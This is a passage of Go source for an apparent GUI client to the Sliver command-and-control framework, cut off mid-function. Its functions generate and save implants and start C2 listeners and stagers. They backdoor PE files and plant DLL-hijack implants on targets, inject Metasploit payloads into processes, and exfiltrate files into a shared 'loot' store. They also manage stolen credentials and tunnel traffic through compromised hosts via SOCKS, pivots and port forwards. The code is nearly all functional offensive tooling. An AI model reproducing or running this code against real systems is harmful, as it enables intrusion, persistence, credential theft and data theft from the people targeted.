// ─── Reverse port forwarding (session) ──────────────────────────────────────────

type RportFwdView struct {
	ID      uint32 `json:"id"`
	Bind    string `json:"bind"`
	Forward string `json:"forward"`
}

func (a *App) StartRportFwd(sessionID, bindAddr string, bindPort int, fwdAddr string, fwdPort int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StartRportFwdListener(a.ctx, &sliverpb.RportFwdStartListenerReq{
		BindAddress:    bindAddr,
		BindPort:       uint32(bindPort),
		ForwardAddress: fwdAddr,
		ForwardPort:    uint32(fwdPort),
		Request:        &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) ListRportFwds(sessionID string) ([]RportFwdView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetRportFwdListeners(a.ctx, &sliverpb.RportFwdListenersReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]RportFwdView, 0, len(resp.Listeners))
	for _, l := range resp.Listeners {
		out = append(out, RportFwdView{
			ID:      l.ID,
			Bind:    fmt.Sprintf("%s:%d", l.BindAddress, l.BindPort),
			Forward: fmt.Sprintf("%s:%d", l.ForwardAddress, l.ForwardPort),
		})
	}
	return out, nil
}

func (a *App) StopRportFwd(sessionID string, id uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StopRportFwdListener(a.ctx, &sliverpb.RportFwdStopListenerReq{
		ID:      id,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ReconfigureBeacon changes a live beacon's check-in interval/jitter (seconds).
// Applied on the beacon's next check-in.
func (a *App) ReconfigureBeacon(beaconID string, interval, jitter int64) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Reconfigure(a.ctx, &sliverpb.ReconfigureReq{
		BeaconInterval: interval * int64(time.Second),
		BeaconJitter:   jitter * int64(time.Second),
		Request:        &commonpb.Request{BeaconID: beaconID, Async: true},
	})
	return err
}

// InteractiveBeacon asks a beacon to open an interactive session on next check-in.
func (a *App) InteractiveBeacon(beaconID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.OpenSession(a.ctx, &sliverpb.OpenSession{
		Request: &commonpb.Request{BeaconID: beaconID, Async: true},
	})
	return err
}

// ─── Regenerate / Hosts / Creds (server) ────────────────────────────────────────

// RegenerateBuild re-downloads a previously built implant by name and saves it.
func (a *App) RegenerateBuild(name string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	resp, err := client.RPC.Regenerate(a.ctx, &clientpb.RegenerateReq{ImplantName: name})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	if resp.File == nil {
		return TransferResult{Error: "no stored build for " + name}
	}
	savePath, err := runtime.SaveFileDialog(a.ctx, runtime.SaveDialogOptions{
		DefaultFilename: resp.File.Name,
		Title:           "Save regenerated implant",
	})
	if err != nil || savePath == "" {
		return TransferResult{Error: "save cancelled"}
	}
	if err := os.WriteFile(savePath, resp.File.Data, 0755); err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: savePath, Bytes: int64(len(resp.File.Data))}
}

type HostView struct {
	ID        string `json:"id"`
	Hostname  string `json:"hostname"`
	OS        string `json:"os"`
	UUID      string `json:"uuid"`
	Locale    string `json:"locale"`
	FirstSeen string `json:"firstSeen"`
}

func (a *App) ListHosts() ([]HostView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Hosts(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]HostView, 0, len(resp.Hosts))
	for _, h := range resp.Hosts {
		fs := ""
		if h.FirstContact > 0 {
			fs = time.Unix(h.FirstContact, 0).Format("2006-01-02 15:04")
		}
		out = append(out, HostView{ID: h.ID, Hostname: h.Hostname, OS: h.OSVersion, UUID: h.HostUUID, Locale: h.Locale, FirstSeen: fs})
	}
	return out, nil
}

func (a *App) DeleteHost(hostID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.HostRm(a.ctx, &clientpb.Host{ID: hostID})
	return err
}

type CredView struct {
	ID       string `json:"id"`
	Username string `json:"username"`
	Plain    string `json:"plaintext"`
	Hash     string `json:"hash"`
	Cracked  bool   `json:"cracked"`
}

func (a *App) ListCreds() ([]CredView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Creds(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]CredView, 0, len(resp.Credentials))
	for _, c := range resp.Credentials {
		out = append(out, CredView{ID: c.ID, Username: c.Username, Plain: c.Plaintext, Hash: c.Hash, Cracked: c.IsCracked})
	}
	return out, nil
}

func (a *App) AddCred(username, plaintext, hash string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.CredsAdd(a.ctx, &clientpb.Credentials{
		Credentials: []*clientpb.Credential{{Username: username, Plaintext: plaintext, Hash: hash}},
	})
	return err
}

func (a *App) DeleteCred(id string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.CredsRm(a.ctx, &clientpb.Credentials{
		Credentials: []*clientpb.Credential{{ID: id}},
	})
	return err
}

// ─── Websites / Canaries (server) ───────────────────────────────────────────────

type WebsiteView struct {
	ID    string `json:"id"`
	Name  string `json:"name"`
	Paths int    `json:"paths"`
}

func (a *App) ListWebsites() ([]WebsiteView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Websites(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]WebsiteView, 0, len(resp.Websites))
	for _, w := range resp.Websites {
		out = append(out, WebsiteView{ID: w.ID, Name: w.Name, Paths: len(w.Contents)})
	}
	return out, nil
}

func (a *App) RemoveWebsite(name string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.WebsiteRemove(a.ctx, &clientpb.Website{Name: name})
	return err
}

type CanaryView struct {
	Domain      string `json:"domain"`
	ImplantName string `json:"implantName"`
	Triggered   bool   `json:"triggered"`
	Count       uint32 `json:"count"`
	Latest      string `json:"latest"`
}

func (a *App) ListCanaries() ([]CanaryView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Canaries(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]CanaryView, 0, len(resp.Canaries))
	for _, c := range resp.Canaries {
		out = append(out, CanaryView{Domain: c.Domain, ImplantName: c.ImplantName, Triggered: c.Triggered, Count: c.Count, Latest: c.LatestTrigger})
	}
	return out, nil
}

// StartStagerListener starts a TCP stager listener that serves a stage built
// from a saved implant profile.
func (a *App) StartStagerListener(host string, port uint32, profileName string) (uint32, error) {
	client, err := a.requireClient()
	if err != nil {
		return 0, err
	}
	resp, err := client.RPC.StartTCPStagerListener(a.ctx, &clientpb.StagerListenerReq{
		Host:        host,
		Port:        port,
		ProfileName: profileName,
	})
	if err != nil {
		return 0, err
	}
	return resp.JobID, nil
}

// ─── Post-exploitation: backdoor / dllhijack / msf (session) ─────────────────────

// Backdoor injects an implant (from a profile) into an existing PE on the target.
func (a *App) Backdoor(sessionID, remoteFilePath, profileName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Backdoor(a.ctx, &clientpb.BackdoorReq{
		FilePath:    remoteFilePath,
		ProfileName: profileName,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// DllHijack plants a hijacking DLL at TargetLocation, cloning exports from a
// reference DLL and embedding an implant (from a profile).
func (a *App) DllHijack(sessionID, referenceDLLPath, targetLocation, profileName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.HijackDLL(a.ctx, &clientpb.DllHijackReq{
		ReferenceDLLPath: referenceDLLPath,
		TargetLocation:   targetLocation,
		ProfileName:      profileName,
		Request:          &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// MsfInject runs a Metasploit payload in the session's own process.
func (a *App) MsfInject(sessionID, payload, lhost string, lport uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Msf(a.ctx, &clientpb.MSFReq{
		Payload: payload,
		LHost:   lhost,
		LPort:   lport,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// MsfRemoteInject runs a Metasploit payload injected into another process (pid).
func (a *App) MsfRemoteInject(sessionID, payload, lhost string, lport, pid uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.MsfRemote(a.ctx, &clientpb.MSFRemoteReq{
		Payload: payload,
		LHost:   lhost,
		LPort:   lport,
		PID:     pid,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── WireGuard tunneling (session, WG implants) ─────────────────────────────────

func (a *App) WGStartPortForward(sessionID string, localPort int, remoteAddr string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.WGStartPortForward(a.ctx, &sliverpb.WGPortForwardStartReq{
		LocalPort:     int32(localPort),
		RemoteAddress: remoteAddr,
		Request:       &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) WGStopPortForward(sessionID string, id int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.WGStopPortForward(a.ctx, &sliverpb.WGPortForwardStopReq{
		ID:      int32(id),
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) WGStartSocks(sessionID string, port int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.WGStartSocks(a.ctx, &sliverpb.WGSocksStartReq{
		Port:    int32(port),
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) WGStopSocks(sessionID string, id int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.WGStopSocks(a.ctx, &sliverpb.WGSocksStopReq{
		ID:      int32(id),
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Loot ────────────────────────────────────────────────────────────────────

type LootView struct {
	ID   string `json:"id"`
	Name string `json:"name"`
	Type string `json:"type"`
}

func (a *App) GetLoot() ([]LootView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.LootAll(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]LootView, 0, len(resp.Loot))
	for _, l := range resp.Loot {
		// clientpb.Loot has no Type/Credential field in v1.7.3 — only FileType.
		out = append(out, LootView{ID: l.ID, Name: l.Name, Type: l.FileType.String()})
	}
	return out, nil
}

func (a *App) DeleteLoot(lootID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.LootRm(a.ctx, &clientpb.Loot{ID: lootID})
	return err
}

// LootFile downloads a file from a session and saves it into the teamserver's
// shared loot store (Sliver's `download --loot`). It's now available to every
// operator on the team, and survives the session.
func (a *App) LootFile(sessionID, remotePath string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	resp, err := client.RPC.Download(a.ctx, &sliverpb.DownloadReq{
		Path:             remotePath,
		RestrictedToFile: true,
		Request:          &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.IsDir {
		return fmt.Errorf("%s is a directory — loot a single file", remotePath)
	}
	data, err := decodeDownload(resp)
	if err != nil {
		return err
	}
	base := filepath.Base(remotePath)
	_, err = client.RPC.LootAdd(a.ctx, &clientpb.Loot{
		Name: base,
		File: &commonpb.File{Name: base, Data: data},
	})
	return err
}

// DownloadLoot fetches a loot item's content from the teamserver and saves it
// locally via a native dialog (Sliver's `loot fetch`).
func (a *App) DownloadLoot(lootID string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	resp, err := client.RPC.LootContent(a.ctx, &clientpb.Loot{ID: lootID})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	if resp.File == nil {
		return TransferResult{Error: "this loot item has no file content"}
	}
	savePath, err := runtime.SaveFileDialog(a.ctx, runtime.SaveDialogOptions{
		DefaultFilename: resp.File.Name,
		Title:           "Save loot",
	})
	if err != nil || savePath == "" {
		return TransferResult{Error: "save cancelled"}
	}
	if err := os.WriteFile(savePath, resp.File.Data, 0644); err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: savePath, Bytes: int64(len(resp.File.Data))}
}

// ─── Build History ────────────────────────────────────────────────────────────

type BuildView struct {
	Name   string   `json:"name"`
	GOOS   string   `json:"goos"`
	GOARCH string   `json:"goarch"`
	Format string   `json:"format"`
	Debug  bool     `json:"debug"`
	C2URLs []string `json:"c2Urls"`
}

func (a *App) GetBuildHistory() ([]BuildView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.ImplantBuilds(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]BuildView, 0, len(resp.Configs))
	for name, cfg := range resp.Configs {
		urls := make([]string, 0, len(cfg.C2))
		for _, c := range cfg.C2 {
			urls = append(urls, c.URL)
		}
		out = append(out, BuildView{
			Name:   name,
			GOOS:   cfg.GOOS,
			GOARCH: cfg.GOARCH,
			Format: cfg.Format.String(),
			Debug:  cfg.Debug,
			C2URLs: urls,
		})
	}
	return out, nil
}

// DeleteBuild removes a saved implant build from the teamserver by name. Useful
// for clearing a stale record (e.g. a build that saved server-side but failed to
// download) that would otherwise trip the UNIQUE name constraint on regenerate.
func (a *App) DeleteBuild(name string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.DeleteImplantBuild(a.ctx, &clientpb.DeleteReq{Name: name})
	return err
}

// ─── Beacons ─────────────────────────────────────────────────────────────────

type BeaconView struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	Transport   string `json:"transport"`
	RemoteAddr  string `json:"remoteAddress"`
	PID         int32  `json:"pid"`
	Interval    int64  `json:"interval"`
	Jitter      int64  `json:"jitter"`
	LastCheckin string `json:"lastCheckin"`
	NextCheckin string `json:"nextCheckin"`
	IsDead      bool   `json:"isDead"`
}

func (a *App) ListBeacons() ([]BeaconView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetBeacons(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]BeaconView, 0, len(resp.Beacons))
	for _, b := range resp.Beacons {
		out = append(out, BeaconView{
			ID:          b.ID,
			Name:        b.Name,
			Hostname:    b.Hostname,
			Username:    b.Username,
			OS:          b.OS,
			Arch:        b.Arch,
			Transport:   b.Transport,
			RemoteAddr:  b.RemoteAddress,
			PID:         b.PID,
			Interval:    b.Interval,
			Jitter:      b.Jitter,
			LastCheckin: time.Unix(b.LastCheckin, 0).Format("15:04:05"),
			NextCheckin: time.Unix(b.NextCheckin, 0).Format("15:04:05"),
			IsDead:      b.IsDead,
		})
	}
	return out, nil
}

func (a *App) KillBeacon(beaconID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RmBeacon(a.ctx, &clientpb.Beacon{ID: beaconID})
	return err
}

// ─── Operators ────────────────────────────────────────────────────────────────

type OperatorView struct {
	Name   string `json:"name"`
	Online bool   `json:"online"`
}

func (a *App) ListOperators() ([]OperatorView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	ops, err := client.ListOperators(a.ctx)
	if err != nil {
		return nil, err
	}
	out := make([]OperatorView, 0, len(ops))
	for _, o := range ops {
		out = append(out, OperatorView{Name: o.Name, Online: o.Online})
	}
	return out, nil
}

// ─── Listeners / Jobs ─────────────────────────────────────────────────────────

type JobView struct {
	ID       uint32 `json:"id"`
	Name     string `json:"name"`
	Protocol string `json:"protocol"`
	Port     uint32 `json:"port"`
}

func (a *App) ListJobs() ([]JobView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetJobs(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]JobView, 0, len(resp.Active))
	for _, j := range resp.Active {
		out = append(out, JobView{ID: j.ID, Name: j.Name, Protocol: j.Protocol, Port: j.Port})
	}
	return out, nil
}

func (a *App) KillJob(jobID uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.KillJob(a.ctx, &clientpb.KillJobReq{ID: jobID})
	return err
}

type StartMTLSReq struct {
	Host string `json:"host"`
	Port uint32 `json:"port"`
}

func (a *App) StartMTLSListener(req StartMTLSReq) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StartMTLSListener(a.ctx, &clientpb.MTLSListenerReq{Host: req.Host, Port: req.Port})
	return err
}

type StartHTTPReq struct {
	Host   string `json:"host"`
	Port   uint32 `json:"port"`
	Secure bool   `json:"secure"`
}

func (a *App) StartHTTPListener(req StartHTTPReq) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	if req.Secure {
		_, err = client.RPC.StartHTTPSListener(a.ctx, &clientpb.HTTPListenerReq{Host: req.Host, Port: req.Port})
	} else {
		_, err = client.RPC.StartHTTPListener(a.ctx, &clientpb.HTTPListenerReq{Host: req.Host, Port: req.Port})
	}
	return err
}

type StartDNSReq struct {
	Domains []string `json:"domains"`
}

func (a *App) StartDNSListener(req StartDNSReq) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StartDNSListener(a.ctx, &clientpb.DNSListenerReq{Domains: req.Domains})
	return err
}

type StartWGReq struct {
	Port    uint32 `json:"port"`
	NPort   uint32 `json:"nPort"`
	KeyPort uint32 `json:"keyPort"`
}

func (a *App) StartWGListener(req StartWGReq) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StartWGListener(a.ctx, &clientpb.WGListenerReq{Port: req.Port, NPort: req.NPort, KeyPort: req.KeyPort})
	return err
}

// ─── C2 Profiles ─────────────────────────────────────────────────────────────

type C2ProfileView struct {
	Name string `json:"name"`
}

func (a *App) ListC2Profiles() ([]C2ProfileView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	profiles, err := client.ListHTTPC2Profiles(a.ctx)
	if err != nil {
		return nil, err
	}
	out := make([]C2ProfileView, 0, len(profiles))
	for _, p := range profiles {
		out = append(out, C2ProfileView{Name: p.Name})
	}
	return out, nil
}

// ListenerC2Options returns ready-to-use C2 URLs built from the active listeners,
// so the Generate form can offer a dropdown that auto-fills a valid C2 URL. The
// host is taken from the teamserver address the operator connected to.
func (a *App) ListenerC2Options() ([]string, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetJobs(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	host := client.Config.LHost
	out := []string{}
	for _, j := range resp.Active {
		// Job.Protocol is the transport ("tcp"/"udp"); the C2 scheme is in
		// Job.Name ("mtls"/"http"/"https"/"dns"/"wg"). Derive the scheme from the
		// name and skip non-C2 jobs (e.g. the operator/gRPC listener) so we never
		// point an implant at the teamserver's operator port.
		name := strings.ToLower(j.Name)
		var scheme string
		switch {
		case strings.Contains(name, "mtls"):
			scheme = "mtls"
		case strings.Contains(name, "https"):
			scheme = "https"
		case strings.Contains(name, "http"):
			scheme = "http"
		case strings.Contains(name, "dns"):
			scheme = "dns"
		case strings.Contains(name, "wg"), strings.Contains(name, "wireguard"):
			scheme = "wg"
		default:
			continue // not a C2 listener we can build a URL for
		}
		out = append(out, fmt.Sprintf("%s://%s:%d", scheme, host, j.Port))
	}
	return out, nil
}

// ─── Implant Generation ───────────────────────────────────────────────────────

type GenerateRequest struct {
	Name     string `json:"name"`
	GOOS     string `json:"goos"`
	GOARCH   string `json:"goarch"`
	Format   string `json:"format"`
	C2URL    string `json:"c2Url"`
	Debug    bool   `json:"debug"`
	Beacon   bool   `json:"beacon"`   // generate in beacon mode instead of session mode
	Interval int64  `json:"interval"` // beacon check-in interval, seconds
	Jitter   int64  `json:"jitter"`   // beacon jitter, seconds
}

type GenerateResult struct {
	File  string `json:"file"`
	Error string `json:"error,omitempty"`
}

// firstHTTPC2ProfileName returns the name of the first HTTP C2 profile the
// teamserver knows about, or "" if there are none. Used to pick a valid
// HTTPC2ConfigName when generating an HTTP(S) implant.
func (a *App) firstHTTPC2ProfileName() (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	profiles, err := client.ListHTTPC2Profiles(a.ctx)
	if err != nil {
		return "", err
	}
	// Prefer one literally named "default" if present, else the first.
	for _, p := range profiles {
		if strings.EqualFold(p.Name, "default") {
			return p.Name, nil
		}
	}
	if len(profiles) > 0 {
		return profiles[0].Name, nil
	}
	return "", nil
}

func (a *App) GenerateImplant(req GenerateRequest) GenerateResult {
	client, err := a.requireClient()
	if err != nil {
		return GenerateResult{Error: err.Error()}
	}
	if strings.TrimSpace(req.C2URL) == "" {
		return GenerateResult{Error: "a C2 URL is required (select a listener or enter one)"}
	}
	cfg := a.buildImplantConfig(req)
	// Build names must be unique in the teamserver DB (UNIQUE constraint on
	// implant_builds.name). If the operator left the name blank, synthesise a
	// unique one so repeated generates never collide.
	autoName := strings.TrimSpace(req.Name) == ""
	name := strings.TrimSpace(req.Name)
	if autoName {
		name = fmt.Sprintf("%s-%s-%s", req.GOOS, req.GOARCH, randSuffix())
	}
	genReq := &clientpb.GenerateReq{
		Name:   name,
		Config: cfg,
	}

	// Generate, retrying with a fresh random name on a UNIQUE-constraint
	// collision (the teamserver keys implant_builds by name). Only auto-retry
	// when the operator didn't supply their own name.
	var resp *clientpb.Generate
	for attempt := 0; attempt < 5; attempt++ {
		resp, err = client.GenerateImplant(a.ctx, genReq)
		if err == nil {
			break
		}
		if !strings.Contains(err.Error(), "UNIQUE constraint") {
			return GenerateResult{Error: err.Error()}
		}
		if !autoName {
			return GenerateResult{Error: fmt.Sprintf("a build named %q already exists — delete it in the Builds panel or choose another name", name)}
		}
		genReq.Name = fmt.Sprintf("%s-%s-%s", req.GOOS, req.GOARCH, randSuffix())
	}
	if err != nil {
		return GenerateResult{Error: "build name keeps colliding after several tries — the teamserver may derive the build name from the config; delete old builds in the Builds panel and retry: " + err.Error()}
	}
	if resp.File == nil {
		return GenerateResult{Error: "server returned an empty build"}
	}
	// The compiled implant bytes come back in resp.File.Data — save them to disk
	// via a native dialog, otherwise the build only lives on the teamserver.
	savePath, err := runtime.SaveFileDialog(a.ctx, runtime.SaveDialogOptions{
		DefaultFilename: resp.File.Name,
		Title:           "Save generated implant",
	})
	if err != nil || savePath == "" {
		return GenerateResult{Error: "build succeeded but save was cancelled — build \"" + resp.File.Name + "\" is stored on the teamserver (regenerate to download again)"}
	}
	if err := os.WriteFile(savePath, resp.File.Data, 0755); err != nil {
		return GenerateResult{Error: err.Error()}
	}
	return GenerateResult{File: savePath}
}

// randSuffix returns 8 random hex chars, used to make auto-generated implant
// names unique so repeated blank-name generates never collide in the DB.
func randSuffix() string {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		// crypto/rand should never fail; fall back to a nanosecond timestamp.
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

// schemeOf returns the URL scheme (the part before "://"), e.g. "mtls" for
// "mtls://host:port". Returns "" if there is no scheme separator.
func schemeOf(url string) string {
	if i := strings.Index(url, "://"); i >= 0 {
		return url[:i]
	}
	return ""
}

func formatFromString(s string) clientpb.OutputFormat {
	switch s {
	case "shared":
		return clientpb.OutputFormat_SHARED_LIB
	case "service":
		return clientpb.OutputFormat_SERVICE
	case "shellcode":
		return clientpb.OutputFormat_SHELLCODE
	default:
		return clientpb.OutputFormat_EXECUTABLE
	}
}

// ─── Pivot Listeners (per-session) ─────────────────────────────────────────────

type PivotView struct {
	ID          string `json:"id"`
	Type        string `json:"type"`
	BindAddress string `json:"bindAddress"`
}

func (a *App) ListPivots(sessionID string) ([]PivotView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.PivotSessionListeners(a.ctx, &sliverpb.PivotListenersReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]PivotView, 0, len(resp.Listeners))
	for _, l := range resp.Listeners {
		out = append(out, PivotView{
			ID:          fmt.Sprintf("%d", l.ID),
			Type:        l.Type.String(),
			BindAddress: l.BindAddress,
		})
	}
	return out, nil
}

// StartPivotListener starts a TCP or named-pipe pivot on the implant.
// pivotType: "tcp" or "pipe". bindAddress e.g. "0.0.0.0:9898" (tcp) or a pipe name.
func (a *App) StartPivotListener(sessionID, pivotType, bindAddress string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	pt := sliverpb.PivotType_TCP
	if strings.Contains(strings.ToLower(pivotType), "pipe") {
		pt = sliverpb.PivotType_NamedPipe
	}
	_, err = client.RPC.PivotStartListener(a.ctx, &sliverpb.PivotStartListenerReq{
		Type:        pt,
		BindAddress: bindAddress,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) StopPivotListener(sessionID string, pivotID uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.PivotStopListener(a.ctx, &sliverpb.PivotStopListenerReq{
		ID:      pivotID,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── SOCKS5 Proxy ──────────────────────────────────────────────────────────────
//
// The Sliver implant runs the actual SOCKS5 server; the client side just relays
// raw TCP bytes over a SocksProxy bidi stream. We open one stream per accepted
// local connection with a unique TunnelID, and copy bytes in both directions.

type socksProxyHandle struct {
	localPort int
	cancel    context.CancelFunc
	listener  net.Listener
}

func (a *App) StartSocksProxy(sessionID string, localPort int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	a.advMu.Lock()
	if _, ok := a.socks[sessionID]; ok {
		a.advMu.Unlock()
		return fmt.Errorf("a SOCKS5 proxy is already running for this session")
	}
	a.advMu.Unlock()

	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
		return fmt.Errorf("listen on 127.0.0.1:%d: %w", localPort, err)
	}
	ctx, cancel := context.WithCancel(a.ctx)
	a.advMu.Lock()
	a.socks[sessionID] = &socksProxyHandle{localPort: localPort, cancel: cancel, listener: ln}
	a.advMu.Unlock()

	go a.runSocks(ctx, client, sessionID, ln)
	return nil
}

func (a *App) StopSocksProxy(sessionID string) error {
	a.advMu.Lock()
	h := a.socks[sessionID]
	delete(a.socks, sessionID)
	a.advMu.Unlock()
	if h == nil {
		return fmt.Errorf("no SOCKS5 proxy running for this session")
	}
	h.listener.Close()
	h.cancel()
	return nil
}

// SocksProxyStatus returns the local port for an active proxy, or 0 if none.
func (a *App) SocksProxyStatus(sessionID string) int {
	a.advMu.Lock()
	defer a.advMu.Unlock()
	if h := a.socks[sessionID]; h != nil {
		return h.localPort
	}
	return 0
}

func (a *App) runSocks(ctx context.Context, client *sliverclient.Client, sessionID string, ln net.Listener) {
	go func() { <-ctx.Done(); ln.Close() }()
	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		go a.socksHandleConn(ctx, client, sessionID, conn)
	}
}

func (a *App) socksHandleConn(ctx context.Context, client *sliverclient.Client, sessionID string, conn net.Conn) {
	defer conn.Close()
	// Register a socks tunnel with the teamserver first so the server can route
	// this stream's frames to the implant's SOCKS server by TunnelID.
	sk, err := client.RPC.CreateSocks(ctx, &sliverpb.Socks{SessionID: sessionID})
	if err != nil {
		return
	}
	tunnelID := sk.TunnelID
	stream, err := client.RPC.SocksProxy(ctx)
	if err != nil {
		return
	}
	defer client.RPC.CloseSocks(ctx, &sliverpb.Socks{TunnelID: tunnelID})
	var seq uint64

	// stream -> local conn
	go func() {
		for {
			data, err := stream.Recv()
			if err != nil {
				conn.Close()
				return
			}
			if len(data.Data) > 0 {
				if _, werr := conn.Write(data.Data); werr != nil {
					return
				}
			}
			if data.CloseConn {
				conn.Close()
				return
			}
		}
	}()

	// local conn -> stream
	buf := make([]byte, 4096)
	for {
		n, rerr := conn.Read(buf)
		if n > 0 {
			if serr := stream.Send(&sliverpb.SocksData{
				TunnelID: tunnelID,
				Data:     append([]byte(nil), buf[:n]...),
				Sequence: seq,
				Request:  &commonpb.Request{SessionID: sessionID},
			}); serr != nil {
				break
			}
			seq++
		}
		if rerr != nil {
			break
		}
	}
	stream.Send(&sliverpb.SocksData{
		TunnelID:  tunnelID,
		CloseConn: true,
		Sequence:  seq,
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	stream.CloseSend()
}

// ─── Port Forwarding ───────────────────────────────────────────────────────────
//
// Same raw-relay pattern as SOCKS5, but over the generic Tunnel API. Each local
// connection creates a tunnel and a TunnelData bidi stream, and we copy bytes.
//
// NOTE: the remote target is sent as the first TunnelData frame so the implant
// knows where to dial. Verify this handshake against your sliver v1.7.3 implant
// on-device — if the implant expects the target elsewhere this is the one spot
// to adjust; the byte-relay loop below is protocol-agnostic.

type portfwdHandle struct {
	localPort int
	remote    string
	cancel    context.CancelFunc
	listener  net.Listener
}

type PortForwardView struct {
	LocalPort int    `json:"localPort"`
	Remote    string `json:"remote"`
}

func (a *App) AddPortForward(sessionID string, localPort int, remoteHost string, remotePort int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	remote := fmt.Sprintf("%s:%d", remoteHost, remotePort)
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
